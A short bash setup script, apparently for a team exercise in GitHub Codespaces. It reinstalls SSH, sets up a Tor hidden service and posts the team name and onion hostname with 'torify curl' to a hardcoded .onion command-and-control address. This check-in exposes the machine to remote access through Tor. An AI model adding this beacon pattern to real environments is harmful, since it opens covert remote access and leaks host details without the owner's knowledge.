#!/bin/bash

CC_HOST="oldmtl2sglxikhgtenomsgkrvkm5hgnvhhrqpnkryq7c4tunjpcw6tqd"

sudo apt update

# export UCF_FORCE_CONFFNEW=1
# export DEBIAN_FRONTEND=noninteractive
# --force-confask --force-confdef --force-confold ...
# sudo apt-get -o Dpkg::Options::=--force-confnew install -y --allow-downgrades --allow-remove-essential --allow-change-held-packages openssh-server
# hammer just works
sudo apt-get purge -y openssh-server
sudo apt-get install -y openssh-server

sudo /etc/init.d/ssh restart

sudo cp .devcontainer/torrc /etc/tor/torrc


sudo /etc/init.d/tor restart

.devcontainer/treasures.sh

echo "##########################"
echo ""
until sudo [ -f ./hs/hostname ]
do
     sleep 5
done
TOR_HOSTNAME=`sudo cat ./hs/hostname`
TEAM="TEAM ${CODESPACE_NAME}: ${TOR_HOSTNAME}"

echo ""
torify curl -d "team=${CODESPACE_NAME}&hs=${TOR_HOSTNAME}" "http://${CC_HOST}.onion/cc/"
echo ""

echo $TOR_HOSTNAME

echo ""
echo ""
